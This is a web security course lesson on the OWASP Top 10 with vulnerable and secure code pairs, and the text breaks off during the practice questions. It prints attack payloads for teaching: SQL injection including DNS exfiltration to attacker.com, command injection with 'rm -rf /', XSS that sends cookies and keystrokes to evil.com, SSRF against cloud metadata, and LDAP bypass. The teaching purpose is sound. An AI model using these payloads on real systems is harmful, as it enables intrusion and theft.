# Module 6, Lesson 2: OWASP Top 10 & Web Application Vulnerabilities

## Table of Contents
- [Introduction](#introduction)
- [Media Resources](#media-resources)
- [Part 1: OWASP Top 10 2021 Overview](#part-1-owasp-top-10-2021-overview)
- [Part 2: Injection Vulnerabilities](#part-2-injection-vulnerabilities)
- [Part 3: Broken Authentication & Access Control](#part-3-broken-authentication--access-control)
- [Part 4: Cross-Site Scripting (XSS)](#part-4-cross-site-scripting-xss)
- [Part 5: Other Critical Vulnerabilities](#part-5-other-critical-vulnerabilities)
- [Practice Questions](#practice-questions)
- [Summary](#summary)

---

## Introduction

The OWASP Top 10 represents the most critical security risks to web applications, compiled from real-world vulnerability data. Understanding these vulnerabilities deeply - how they work, how to detect them, and how to prevent them - is essential for any security architect. This lesson covers each vulnerability category with attack examples, code samples, and defense strategies.

---

## Media Resources

### Recommended Videos
- "OWASP Top 10 2021 Explained" - OWASP Foundation
- "Web Application Security Testing" - PortSwigger Academy
- "SQL Injection Deep Dive" - LiveOverflow
- "XSS Attacks and Prevention" - PentesterLab

### Recommended Reading
- OWASP Top 10 2021: https://owasp.org/Top10/
- OWASP Web Security Testing Guide
- PortSwigger Web Security Academy (free labs)
- "The Web Application Hacker's Handbook" - Stuttard & Pinto

---

## Part 1: OWASP Top 10 2021 Overview

### The Banking Analogy

Think of web application security like bank security:

| Bank Security | Web Application Security |
|---------------|-------------------------|
| Vault door | Access control |
| ID verification | Authentication |
| Counterfeit detection | Input validation |
| Security cameras | Logging & monitoring |
| Armored transport | Encryption in transit |
| Background checks | Software composition analysis |
| Alarm system | Intrusion detection |

### OWASP Top 10 2021 Categories

```
OWASP Top 10 2021:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Rank  Category                         Change from 2017   │
│  ─────────────────────────────────────────────────────      │
│  A01   Broken Access Control            ▲ (was #5)         │
│  A02   Cryptographic Failures           ▲ (was #3 Sensitive│
│                                            Data Exposure)  │
│  A03   Injection                        ▼ (was #1)         │
│  A04   Insecure Design                  NEW                │
│  A05   Security Misconfiguration        ▲ (was #6)         │
│  A06   Vulnerable Components            ▲ (was #9)         │
│  A07   Auth & Session Failures          ▼ (was #2)         │
│  A08   Software & Data Integrity        NEW (includes      │
│                                            Insecure Deser) │
│  A09   Security Logging Failures        ▲ (was #10)        │
│  A10   Server-Side Request Forgery      NEW                │
│                                                             │
│  Removed/Merged:                                           │
│  • XXE merged into Security Misconfiguration               │
│  • XSS merged into Injection                               │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Vulnerability Landscape

```
Vulnerability Prevalence (Real-World Data):
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Category                    % of Apps    Avg CVEs/App      │
│  ─────────────────────────────────────────────────────      │
│  Broken Access Control         94%           3.81           │
│  Cryptographic Failures        80%           2.24           │
│  Injection                     72%           2.90           │
│  Insecure Design              68%           1.84           │
│  Security Misconfiguration    90%           4.51           │
│  Vulnerable Components        84%          12.70  ← Huge!  │
│  Auth Failures                 65%           2.15           │
│  Integrity Failures            55%           1.62           │
│  Logging Failures              78%           1.94           │
│  SSRF                          45%           1.23           │
│                                                             │
│  Key Insight: Most apps have MULTIPLE vulnerabilities      │
│  from different categories simultaneously                   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 2: Injection Vulnerabilities

### A03: Injection Overview

```
Injection Attack Concept:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Normal Flow:                                               │
│  User Input → Application → Interpreter → Result           │
│  "John"     → SELECT * FROM users WHERE name='John'        │
│              → Returns John's record                        │
│                                                             │
│  Injection Attack:                                          │
│  User Input → Application → Interpreter → MALICIOUS Result │
│  "'; DROP TABLE users;--"                                  │
│              → SELECT * FROM users WHERE name='';          │
│                DROP TABLE users;--'                        │
│              → Deletes entire users table!                 │
│                                                             │
│  Injection Types:                                           │
│  • SQL Injection       (databases)                         │
│  • NoSQL Injection     (MongoDB, etc.)                     │
│  • LDAP Injection      (directory services)                │
│  • OS Command Injection (system commands)                  │
│  • XPath Injection     (XML queries)                       │
│  • Template Injection  (server-side templates)             │
│  • Header Injection    (HTTP headers)                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### SQL Injection Deep Dive

```python
# VULNERABLE CODE - DO NOT USE
def get_user(username):
    # String concatenation - VULNERABLE
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchone()

# Attack payload: ' OR '1'='1' --
# Results in: SELECT * FROM users WHERE username = '' OR '1'='1' --'
# Returns ALL users because '1'='1' is always true

# Attack payload: ' UNION SELECT password FROM admin_users --
# Results in: SELECT * FROM users WHERE username = ''
#             UNION SELECT password FROM admin_users --'
# Extracts admin passwords!
```

```python
# SECURE CODE - Parameterized Queries
def get_user_secure(username):
    # Parameterized query - SECURE
    query = "SELECT * FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchone()

# Attack payload: ' OR '1'='1' --
# Query becomes: SELECT * FROM users WHERE username = ''' OR ''1''=''1'' --'
# Treats entire input as a literal string, no injection possible

# Alternative: ORM (even safer)
def get_user_orm(username):
    return User.query.filter_by(username=username).first()
```

### SQL Injection Types

```
SQL Injection Variants:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. IN-BAND (Classic) SQLi                                  │
│  ─────────────────────────────────────────────────────      │
│  Attacker receives results directly in response             │
│                                                             │
│  • Error-based: Trigger DB errors that reveal data         │
│    Payload: ' AND 1=CONVERT(int,(SELECT TOP 1 table_name   │
│             FROM information_schema.tables))--              │
│                                                             │
│  • Union-based: Add extra SELECT to retrieve data          │
│    Payload: ' UNION SELECT username,password FROM users--  │
│                                                             │
│  2. BLIND SQLi                                              │
│  ─────────────────────────────────────────────────────      │
│  No direct output, infer data from application behavior     │
│                                                             │
│  • Boolean-based: Different responses for true/false       │
│    Payload: ' AND SUBSTRING(password,1,1)='a'--            │
│    (Iterate through characters until finding match)         │
│                                                             │
│  • Time-based: Measure response time differences           │
│    Payload: ' AND IF(1=1,SLEEP(5),0)--                     │
│    (5 second delay means condition was true)               │
│                                                             │
│  3. OUT-OF-BAND SQLi                                        │
│  ─────────────────────────────────────────────────────      │
│  Exfiltrate data through alternative channels              │
│                                                             │
│  • DNS exfiltration:                                       │
│    Payload: '; EXEC xp_dirtree '\\attacker.com\'+          │
│             (SELECT password FROM users)--                  │
│    (Data sent via DNS query to attacker's server)          │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### NoSQL Injection

```javascript
// VULNERABLE MongoDB Query
app.get('/user', (req, res) => {
    const query = { username: req.query.username };
    // If username = {"$gt": ""}, returns ALL users
    db.users.find(query);
});

// Attack URL: /user?username[$gt]=
// Resulting query: { username: { "$gt": "" } }
// Returns all users where username > "" (everyone!)

// Attack URL: /user?username[$regex]=admin.*
// Returns all users starting with "admin"

// SECURE: Validate and sanitize
app.get('/user', (req, res) => {
    const username = String(req.query.username);  // Force string type
    if (!/^[a-zA-Z0-9_]+$/.test(username)) {
        return res.status(400).send('Invalid username');
    }
    db.users.find({ username: username });
});
```

### OS Command Injection

```python
# VULNERABLE CODE
def ping_host(hostname):
    # User input directly in shell command - VULNERABLE
    os.system(f"ping -c 4 {hostname}")

# Attack payload: google.com; cat /etc/passwd
# Executes: ping -c 4 google.com; cat /etc/passwd
# Returns passwd file contents!

# Attack payload: google.com && rm -rf /
# Could delete entire filesystem!

# SECURE: Use subprocess with list arguments
import subprocess
import re

def ping_host_secure(hostname):
    # Validate input
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise ValueError("Invalid hostname")

    # Use list arguments - shell=False prevents injection
    result = subprocess.run(
        ['ping', '-c', '4', hostname],
        capture_output=True,
        text=True,
        shell=False  # Critical!
    )
    return result.stdout
```

### Injection Prevention Summary

```
Injection Prevention Strategies:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Strategy              Effectiveness   Application          │
│  ─────────────────────────────────────────────────────      │
│  Parameterized         ★★★★★          SQL, LDAP            │
│  Queries                              (Best defense)        │
│                                                             │
│  ORMs                  ★★★★★          Database queries     │
│                                       (Additional layer)    │
│                                                             │
│  Input Validation      ★★★★☆          All injection types  │
│  (Whitelist)                          (Defense in depth)    │
│                                                             │
│  Output Encoding       ★★★★★          XSS specifically     │
│                                       (Context-aware)       │
│                                                             │
│  Least Privilege       ★★★☆☆          Limit damage         │
│  (DB accounts)                        (Not prevention)      │
│                                                             │
│  WAF Rules             ★★★☆☆          Known patterns       │
│                                       (Can be bypassed)     │
│                                                             │
│  Code Review           ★★★★☆          Find vulnerabilities │
│  + SAST                               (Detection)           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 3: Broken Authentication & Access Control

### A01: Broken Access Control

```
Access Control Vulnerability Types:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. INSECURE DIRECT OBJECT REFERENCE (IDOR)                │
│  ─────────────────────────────────────────────────────      │
│  User manipulates identifier to access others' data         │
│                                                             │
│  Vulnerable: GET /api/invoices/1234                        │
│  Attack:     GET /api/invoices/1235  (another user's)      │
│                                                             │
│  2. MISSING FUNCTION LEVEL ACCESS CONTROL                  │
│  ─────────────────────────────────────────────────────      │
│  Admin functions accessible to regular users                │
│                                                             │
│  Vulnerable: GET /admin/users (no role check)              │
│  Attack:     Regular user browses to admin endpoint         │
│                                                             │
│  3. PRIVILEGE ESCALATION                                    │
│  ─────────────────────────────────────────────────────      │
│  User gains higher privileges than assigned                 │
│                                                             │
│  Attack:     POST /api/user/update                         │
│              {"username": "attacker", "role": "admin"}     │
│                                                             │
│  4. PATH TRAVERSAL                                          │
│  ─────────────────────────────────────────────────────      │
│  Accessing files outside intended directory                 │
│                                                             │
│  Vulnerable: GET /download?file=report.pdf                 │
│  Attack:     GET /download?file=../../../etc/passwd        │
│                                                             │
│  5. CORS MISCONFIGURATION                                   │
│  ─────────────────────────────────────────────────────      │
│  Overly permissive cross-origin policies                   │
│                                                             │
│  Vulnerable: Access-Control-Allow-Origin: *                │
│  Attack:     Malicious site makes authenticated requests    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### IDOR Examples and Prevention

```python
# VULNERABLE - No authorization check
@app.route('/api/documents/<doc_id>')
def get_document(doc_id):
    doc = Document.query.get(doc_id)
    return jsonify(doc.to_dict())

# Attacker changes doc_id in URL to access others' documents

# SECURE - Verify ownership
@app.route('/api/documents/<doc_id>')
@login_required
def get_document_secure(doc_id):
    doc = Document.query.get(doc_id)

    if doc is None:
        abort(404)

    # Check if user owns document or has explicit access
    if doc.owner_id != current_user.id and \
       not current_user.has_permission('view_all_documents'):
        abort(403)  # Forbidden

    return jsonify(doc.to_dict())

# EVEN BETTER - Query with ownership constraint
@app.route('/api/documents/<doc_id>')
@login_required
def get_document_better(doc_id):
    # Query filters by user, can't access others' docs
    doc = Document.query.filter_by(
        id=doc_id,
        owner_id=current_user.id
    ).first_or_404()

    return jsonify(doc.to_dict())
```

### A07: Authentication Failures

```
Common Authentication Vulnerabilities:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Vulnerability          Attack                   Defense    │
│  ─────────────────────────────────────────────────────      │
│  Weak passwords         Brute force,            Strong      │
│                         dictionary              policy,     │
│                                                 breach      │
│                                                 checking    │
│                                                             │
│  No rate limiting       Credential              Account     │
│                         stuffing                lockout,    │
│                                                 CAPTCHA     │
│                                                             │
│  Predictable session    Session hijacking       Crypto      │
│  tokens                                         random      │
│                                                 tokens      │
│                                                             │
│  Session fixation       Force victim to use     Regenerate  │
│                         attacker's session      session on  │
│                                                 login       │
│                                                             │
│  Missing MFA            Account takeover        Require     │
│                         from phishing           MFA for     │
│                                                 sensitive   │
│                                                 actions     │
│                                                             │
│  Insecure password      Password recovery       Bcrypt/     │
│  storage (MD5, SHA1)    from breach             Argon2,     │
│                                                 high cost   │
│                                                             │
│  Password in URL        Logged in server        POST body,  │
│                         logs, browser           never URL   │
│                         history                             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Secure Session Management

```python
# Session Security Configuration (Flask example)
app.config.update(
    SESSION_COOKIE_SECURE=True,      # HTTPS only
    SESSION_COOKIE_HTTPONLY=True,    # No JavaScript access
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF protection
    PERMANENT_SESSION_LIFETIME=1800,  # 30 min timeout
)

# Secure Login Flow
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Rate limiting check
    if is_rate_limited(username, request.remote_addr):
        return 'Too many attempts', 429

    user = User.query.filter_by(username=username).first()

    if user and bcrypt.check_password_hash(user.password, password):
        # Regenerate session ID to prevent fixation
        session.regenerate()

        session['user_id'] = user.id
        session['login_time'] = time.time()
        session['ip'] = request.remote_addr

        # Log successful login
        log_auth_event('login_success', user.id, request.remote_addr)

        return redirect('/dashboard')
    else:
        # Log failed attempt (same message for user/password wrong)
        log_auth_event('login_failed', username, request.remote_addr)
        return 'Invalid credentials', 401

# Session Validation Middleware
@app.before_request
def validate_session():
    if 'user_id' in session:
        # Check session age
        if time.time() - session.get('login_time', 0) > 1800:
            session.clear()
            return redirect('/login')

        # Optional: Check IP binding (be careful with mobile)
        if session.get('ip') != request.remote_addr:
            log_auth_event('session_ip_mismatch', session['user_id'])
            # Don't auto-logout, but flag for review
```

---

## Part 4: Cross-Site Scripting (XSS)

### XSS Types Overview

```
Cross-Site Scripting (XSS) Categories:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. REFLECTED XSS (Non-Persistent)                         │
│  ─────────────────────────────────────────────────────      │
│  Payload in request, reflected in response                  │
│                                                             │
│  Attack URL: /search?q=<script>alert('XSS')</script>       │
│  Response:   <p>Results for: <script>alert('XSS')</script> │
│                                                             │
│  Delivery: Phishing email with malicious link              │
│                                                             │
│  2. STORED XSS (Persistent)                                │
│  ─────────────────────────────────────────────────────      │
│  Payload stored in database, served to all users           │
│                                                             │
│  Attack: Post comment: "<script>document.location=         │
│          'http://evil.com/?c='+document.cookie</script>"   │
│  Impact: Every user viewing the comment is attacked        │
│                                                             │
│  More dangerous because attack persists                    │
│                                                             │
│  3. DOM-BASED XSS                                          │
│  ─────────────────────────────────────────────────────      │
│  Payload manipulates client-side JavaScript                │
│                                                             │
│  Vulnerable JS: document.write(location.hash)              │
│  Attack URL:    /page#<script>alert('XSS')</script>       │
│                                                             │
│  Never hits server, harder to detect                       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### XSS Attack Scenarios

```
XSS Impact Scenarios:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. SESSION HIJACKING                                       │
│  ─────────────────────────────────────────────────────      │
│  <script>                                                   │
│    new Image().src='http://evil.com/steal?c='+             │
│    document.cookie;                                         │
│  </script>                                                  │
│                                                             │
│  Attacker receives victim's session cookie                 │
│  Prevention: HTTPOnly cookie flag                          │
│                                                             │
│  2. KEYLOGGING                                              │
│  ─────────────────────────────────────────────────────      │
│  <script>                                                   │
│    document.onkeypress = function(e) {                     │
│      new Image().src='http://evil.com/log?k='+e.key;       │
│    }                                                        │
│  </script>                                                  │
│                                                             │
│  Captures everything user types (passwords!)               │
│                                                             │
│  3. PHISHING                                                │
│  ─────────────────────────────────────────────────────      │
│  <script>                                                   │
│    document.body.innerHTML = '<form action="evil.com">'+   │
│    '<h1>Session Expired</h1>'+                             │
│    '<input name="password" type="password">'+              │
│    '<button>Login</button></form>';                        │
│  </script>                                                  │
│                                                             │
│  Replaces page with fake login form                        │
│                                                             │
│  4. CRYPTOMINING                                            │
│  ─────────────────────────────────────────────────────      │
│  <script src="http://evil.com/miner.js"></script>          │
│                                                             │
│  Uses victim's CPU to mine cryptocurrency                  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### XSS Prevention

```python
# Context-Aware Output Encoding

# 1. HTML Context
# User input displayed as text content
"""
VULNERABLE:
<div>{{ user_input }}</div>

With input: <script>alert('XSS')</script>
Output: <div><script>alert('XSS')</script></div>  # Executes!

SECURE (HTML Entity Encoding):
<div>{{ user_input | escape }}</div>

With input: <script>alert('XSS')</script>
Output: <div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>  # Safe!
"""

# 2. JavaScript Context
# User input used in JavaScript
"""
VULNERABLE:
<script>var name = '{{ user_input }}';</script>

With input: '; alert('XSS'); //
Output: <script>var name = ''; alert('XSS'); //';</script>  # Executes!

SECURE (JavaScript Encoding):
<script>var name = {{ user_input | tojson }};</script>

With input: '; alert('XSS'); //
Output: <script>var name = "'; alert('XSS'); //";</script>  # Safe string!
"""

# 3. URL Context
# User input in URL parameters
"""
VULNERABLE:
<a href="/search?q={{ user_input }}">Link</a>

With input: " onclick="alert('XSS')
Output: <a href="/search?q=" onclick="alert('XSS')">Link</a>  # Executes!

SECURE (URL Encoding):
<a href="/search?q={{ user_input | urlencode }}">Link</a>

With input: " onclick="alert('XSS')
Output: <a href="/search?q=%22%20onclick%3D%22alert%28%27XSS%27%29">  # Safe!
"""

# 4. CSS Context
# User input in CSS
"""
VULNERABLE:
<div style="background: {{ user_input }}">

With input: url('javascript:alert(1)')
Output: Potential XSS via CSS expression

SECURE: Whitelist CSS values, never accept arbitrary input
"""
```

### Content Security Policy (CSP)

```
Content Security Policy Headers:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Basic CSP (blocks inline scripts):                        │
│  ─────────────────────────────────────────────────────      │
│  Content-Security-Policy:                                   │
│    default-src 'self';                                     │
│    script-src 'self' https://trusted-cdn.com;              │
│    style-src 'self' 'unsafe-inline';                       │
│    img-src 'self' data: https:;                            │
│    frame-ancestors 'none';                                 │
│    form-action 'self';                                     │
│                                                             │
│  Strict CSP (with nonces):                                 │
│  ─────────────────────────────────────────────────────      │
│  Content-Security-Policy:                                   │
│    default-src 'self';                                     │
│    script-src 'nonce-abc123' 'strict-dynamic';             │
│    style-src 'self' 'nonce-abc123';                        │
│    object-src 'none';                                      │
│    base-uri 'self';                                        │
│                                                             │
│  <!-- Only scripts with matching nonce execute -->         │
│  <script nonce="abc123">                                   │
│    // This runs                                            │
│  </script>                                                  │
│  <script>                                                   │
│    // This is BLOCKED                                      │
│  </script>                                                  │
│                                                             │
│  CSP Reporting:                                             │
│  ─────────────────────────────────────────────────────      │
│  Content-Security-Policy-Report-Only:                       │
│    default-src 'self';                                     │
│    report-uri /csp-report;                                 │
│                                                             │
│  Reports violations without blocking (for testing)         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Part 5: Other Critical Vulnerabilities

### A02: Cryptographic Failures

```
Common Cryptographic Mistakes:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Mistake                  Impact              Fix           │
│  ─────────────────────────────────────────────────────      │
│  MD5/SHA1 for passwords   Rainbow tables      bcrypt/Argon2 │
│  ECB mode encryption      Pattern visible     CBC/GCM mode  │
│  Hardcoded keys           Key compromise      KMS/HSM       │
│  Weak random numbers      Predictable tokens  CSPRNG        │
│  HTTP for sensitive data  Interception        TLS 1.2+      │
│  Self-signed certs (prod) MITM attacks        Valid CA cert │
│  Weak key sizes           Brute force         RSA 2048+,    │
│                                               AES 256       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```python
# Password Hashing: WRONG vs RIGHT

# WRONG - MD5, no salt
import hashlib
password_hash = hashlib.md5(password.encode()).hexdigest()
# Vulnerable to rainbow tables

# WRONG - SHA256, but no salt
password_hash = hashlib.sha256(password.encode()).hexdigest()
# Still vulnerable to rainbow tables

# WRONG - Salt but wrong algorithm
password_hash = hashlib.sha256(salt + password).hexdigest()
# Too fast, can be brute forced

# RIGHT - bcrypt (adaptive work factor)
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# Slow by design, includes salt, adaptive

# RIGHT - Argon2 (memory-hard, recommended)
from argon2 import PasswordHasher
ph = PasswordHasher()
password_hash = ph.hash(password)
# Memory-hard, resists GPU attacks
```

### A04: Insecure Design

```
Insecure Design vs Implementation Flaws:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Implementation Flaw:     Insecure Design:                 │
│  SQL injection in code    No rate limiting designed         │
│  (can be fixed in code)   (requires redesign)              │
│                                                             │
│  Common Insecure Designs:                                   │
│  ─────────────────────────────────────────────────────      │
│                                                             │
│  1. Security Questions for Password Reset                   │
│     Problem: Questions are guessable/public info            │
│     Fix: Email/SMS verification, MFA                       │
│                                                             │
│  2. Unlimited Referral Bonuses                             │
│     Problem: Bot creates fake accounts for bonuses          │
│     Fix: Verification requirements, fraud detection         │
│                                                             │
│  3. Trust Client-Side Validation Only                       │
│     Problem: Attacker bypasses JavaScript validation        │
│     Fix: Always validate server-side                       │
│                                                             │
│  4. Sequential Order Numbers                                │
│     Problem: Competitor can count your orders              │
│     Fix: Random UUIDs for external references              │
│                                                             │
│  5. No Transaction Limits                                   │
│     Problem: Compromised account drains everything          │
│     Fix: Per-transaction and daily limits, step-up auth    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### A10: Server-Side Request Forgery (SSRF)

```
SSRF Attack Concept:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Normal Request:                                            │
│  User → Server → External API                              │
│  /fetch?url=https://api.example.com/data                   │
│                                                             │
│  SSRF Attack:                                               │
│  User → Server → Internal Resource                         │
│  /fetch?url=http://localhost:8080/admin                    │
│  /fetch?url=http://169.254.169.254/metadata  (AWS)         │
│  /fetch?url=http://internal-db:3306/                       │
│                                                             │
│  Attacker tricks server into making requests to            │
│  internal resources the server can access but user cannot  │
│                                                             │
│  SSRF Targets:                                              │
│  ─────────────────────────────────────────────────────      │
│  • Cloud metadata services (AWS, GCP, Azure)               │
│  • Internal APIs and microservices                         │
│  • Internal databases                                      │
│  • Admin interfaces                                        │
│  • Localhost services                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

```python
# VULNERABLE SSRF Code
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # No validation!
    return response.text

# Attack: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns AWS IAM credentials!

# SECURE SSRF Prevention
import ipaddress
from urllib.parse import urlparse

ALLOWED_HOSTS = ['api.example.com', 'partner.example.com']

@app.route('/fetch')
def fetch_url_secure():
    url = request.args.get('url')
    parsed = urlparse(url)

    # Whitelist allowed hosts
    if parsed.hostname not in ALLOWED_HOSTS:
        abort(403, 'Host not allowed')

    # Require HTTPS
    if parsed.scheme != 'https':
        abort(403, 'HTTPS required')

    # Block internal IPs (defense in depth)
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback or ip.is_link_local:
            abort(403, 'Internal addresses not allowed')
    except ValueError:
        pass  # Not an IP, hostname already validated

    response = requests.get(url, timeout=5)
    return response.text
```

### A08: Software and Data Integrity Failures

```
Integrity Failure Types:
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  1. INSECURE DESERIALIZATION                               │
│  ─────────────────────────────────────────────────────      │
│  Attacker crafts malicious serialized object               │
│                                                             │
│  # VULNERABLE Python pickle                                │
│  import pickle                                              │
│  data = pickle.loads(user_input)  # Arbitrary code exec!   │
│                                                             │
│  # Attack payload can execute any code on server           │
│                                                             │
│  Fix: Never deserialize untrusted data                     │
│       Use safe formats (JSON) or sign serialized data      │
│                                                             │
│  2. CI/CD PIPELINE INTEGRITY                               │
│  ─────────────────────────────────────────────────────      │
│  Attacker compromises build/deploy process                 │
│                                                             │
│  Attacks:                                                   │
│  • Inject malicious code into build                        │
│  • Modify deployment artifacts                             │
│  • Compromise dependency source                            │
│                                                             │
│  Fix: Code signing, artifact verification, SLSA framework  │
│                                                             │
│  3. UNSIGNED UPDATES                                        │
│  ─────────────────────────────────────────────────────      │
│  Software updates without cryptographic verification       │
│                                                             │
│  Attack: MITM replaces update with malware                 │
│                                                             │
│  Fix: Sign updates, verify signatures before install       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Practice Questions

### Question 1
A penetration tester reports finding SQL injection in your application's search function. The development team says they're already using an ORM so it's a false positive. How do you investigate and respond?

<details>
<summary>Show Answer</summary>

**Investigation approach:**

1. **Don't dismiss based on assumptions:**
   - ORMs can still be vulnerable if misused
   - Raw queries or query builders might bypass ORM protections

2. **Review the specific code:**
   ```python
   # ORM used safely - NOT vulnerable
   User.query.filter_by(name=user_input).all()

   # ORM with raw SQL - VULNERABLE
   db.session.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

   # ORM with dangerous filter - VULNERABLE
   User.query.filter(text(f"name = '{user_input}'")).all()
   ```

3. **Reproduce the finding:**
   - Use the pentester's payload
   - Check for time delays (blind SQLi)
   - Check for error messages with database info

4. **Response if confirmed:**
   - Acknowledge and thank the pentester
   - Create remediation ticket with appropriate severity
   - Fix using parameterized queries
   - Add SAST rule to catch this pattern
   - Conduct training on safe ORM usage

5. **If false positive:**
   - Document why it's false positive
   - Share context with pentester
   - Consider if tooling needs tuning

**Key point:** Trust but verify - ORMs reduce SQLi risk but don't eliminate it if developers use raw query features.

</details>

### Question 2
Your company's main web application has no Content Security Policy. How would you implement CSP without breaking functionality?

<details>
<summary>Show Answer</summary>

**Phased CSP Implementation:**

**Phase 1: Discovery (1-2 weeks)**
1. Deploy CSP in report-only mode:
   ```
   Content-Security-Policy-Report-Only:
     default-src 'self';
     script-src 'self' 'unsafe-inline' 'unsafe-eval';
     report-uri /csp-reports
   ```
2. Collect violation reports to understand current resource loading
3. Inventory all inline scripts, eval() usage, third-party resources

**Phase 2: Remediate Blockers (2-4 weeks)**
1. Move inline scripts to external files
2. Replace eval() with safer alternatives
3. Add third-party domains to whitelist
4. Implement nonces for necessary inline scripts:
   ```html
   <script nonce="randomly-generated-per-request">
     // Inline script that needs to run
   </script>
   ```

**Phase 3: Tighten Policy (Iterative)**
1. Remove 'unsafe-inline' once inline scripts have nonces
2. Remove 'unsafe-eval' once eval() usage eliminated
3. Add 'strict-dynamic' for modern browsers
4. Final policy example:
   ```
   Content-Security-Policy:
     default-src 'self';
     script-src 'nonce-{random}' 'strict-dynamic';
     style-src 'self' 'nonce-{random}';
     img-src 'self' data: https:;
     connect-src 'self' https://api.example.com;
     frame-ancestors 'none';
     form-action 'self';
     base-uri 'self';
   ```

**Phase 4: Enforce**
1. Switch from Report-Only to enforcing
2. Monitor for breakage in production
3. Keep report-uri active for ongoing monitoring

</details>

### Question 3
An application stores user documents and serves them via `/documents/{document_id}`. How would you prevent IDOR vulnerabilities while supporting legitimate document sharing?

<details>
<summary>Show Answer</summary>

**Comprehensive IDOR prevention with sharing support:**

1. **Authorization model:**
   ```python
   class Document:
       id = UUID  # Non-sequential
       owner_id = ForeignKey(User)

   class DocumentAccess:
       document_id = ForeignKey(Document)
       user_id = ForeignKey(User)
       access_level = Enum('read', 'write', 'admin')
       expires_at = DateTime (nullable)
   ```

2. **Authorization check:**
   ```python
   def can_access_document(user, document, required_access='read'):
       # Owner always has access
       if document.owner_id == user.id:
           return True

       # Check explicit access grants
       access = DocumentAccess.query.filter_by(
           document_id=document.id,
           user_id=user.id
       ).first()

       if not access:
           return False

       # Check expiration
       if access.expires_at and access.expires_at < datetime.now():
           return False

       # Check access level
       access_hierarchy = {'read': 1, 'write': 2, 'admin': 3}
       return access_hierarchy[access.access_level] >= \
              access_hierarchy[required_access]
   ```

3. **Shareable links (optional):**
   ```python
   class ShareLink:
       token = SecureRandomString(32)  # Unguessable
       document_id = ForeignKey(Document)
       access_level = Enum('read', 'write')
       expires_at = DateTime
       max_uses = Integer (nullable)
       use_count = Integer

   # URL: /documents/share/abc123xyz...
   # Anyone with link can access (like Google Docs sharing)
   ```

4. **Audit logging:**
   ```python
   @app.route('/documents/<doc_id>')
   def get_document(doc_id):
       doc = Document.query.get_or_404(doc_id)

       if not can_access_document(current_user, doc):
           log_security_event('unauthorized_document_access', {
               'user': current_user.id,
               'document': doc_id,
               'ip': request.remote_addr
           })
           abort(403)

       log_access('document_view', doc_id, current_user.id)
       return send_document(doc)
   ```

5. **Defense in depth:**
   - Use UUIDs instead of sequential IDs
   - Rate limit document access attempts
   - Alert on access pattern anomalies (user accessing many different documents)

</details>

### Question 4
During a code review, you find the application concatenates user input into LDAP queries. The developer says LDAP injection isn't as serious as SQL injection. How do you respond?

<details>
<summary>Show Answer</summary>

**Response to developer:**

1. **LDAP injection IS serious:**
   ```
   # Vulnerable query
   search_filter = f"(&(uid={username})(userPassword={password}))"

   # Attack payload for username: *)(uid=*))(|(uid=*
   # Resulting filter: (&(uid=*)(uid=*))(|(uid=*)(userPassword=...))
   # This bypasses authentication entirely!
   ```

2. **LDAP injection impacts:**
   - **Authentication bypass:** Log in as any user
   - **Information disclosure:** Extract directory information
   - **Privilege escalation:** Access admin groups
   - **Denial of service:** Expensive queries overload server

3. **Real-world examples:**
   - Authentication bypass in enterprise SSO systems
   - Active Directory enumeration attacks
   - Unauthorized access to group memberships

4. **Remediation:**
   ```python
   # VULNERABLE
   search_filter = f"(uid={username})"

   # SECURE - Use parameterized LDAP libraries
   from ldap3 import escape_filter_chars
   safe_username = escape_filter_chars(username)
   search_filter = f"(uid={safe_username})"

   # Or use prepared statements if library supports
   connection.search(
       search_base='ou=users,dc=example,dc=com',
       search_filter='(uid=%s)',
       attributes=['cn', 'mail'],
       search_filter_args=[username]  # Parameterized
   )
   ```

5. **Key message:**
   Any injection vulnerability that allows attackers to modify query logic is critical. The specific technology (SQL, LDAP, NoSQL, OS commands) doesn't change the fundamental risk.

</details>

### Question 5
How would you explain the difference between stored XSS and reflected XSS to a non-technical executive, and which would you prioritize fixing?

<details>
<summary>Show Answer</summary>

**Executive explanation:**

**Reflected XSS (like email phishing):**
